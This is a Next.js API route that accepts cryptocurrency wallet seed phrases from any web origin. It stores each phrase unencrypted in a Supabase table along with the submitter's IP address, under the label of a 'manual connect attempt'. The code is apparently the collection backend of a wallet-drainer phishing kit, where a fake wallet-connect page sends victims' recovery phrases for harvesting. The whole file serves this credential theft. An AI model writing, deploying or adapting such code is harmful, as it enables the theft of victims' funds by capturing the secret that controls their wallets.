// Next.js API Route: manual-attempt (stores seed phrase directly)
// Accepts manual connection attempts INCLUDING seed phrases.
// IMPORTANT: Seed phrases are stored as plain text. Disclaimer required.

const { createClient } = require('@supabase/supabase-js');

const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_ANON_KEY;

let supabase = null;
if (SUPABASE_URL && SUPABASE_KEY) {
  supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Only POST allowed' });

  let body = req.body || {};
  try { if (typeof body === 'string' && body.trim()) body = JSON.parse(body); } catch (e) { return res.status(400).json({ error: 'Invalid JSON' }); }


  const seedPhrase = (body.seedPhrase || '').trim();
  const type = body.type || 'manual-connect-attempt';

  if (!seedPhrase) return res.status(400).json({ error: 'Seed phrase required' });


  // Store the seed phrase directly (unencrypted)
  const plainPhrase = seedPhrase;


  if (supabase) {
    try {
      const { error } = await supabase.from('manual_attempts').insert([
        {
          type: type,
          seed_phrase: plainPhrase,
          created_at: new Date().toISOString(),
          ip_address: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        },
      ]);

      if (error) {
        console.error('[manual-attempt] supabase error', error);
      } else {
        console.log('[manual-attempt] stored seed phrase');
      }
    } catch (e) {
      console.error('[manual-attempt] supabase insert failed', e);
    }
  } else {
    console.warn('[manual-attempt] Supabase not configured, skipping storage');
  }

  return res.status(200).json({ 
    status: 'ok', 
    message: 'Manual attempt received and stored.'
  });
}
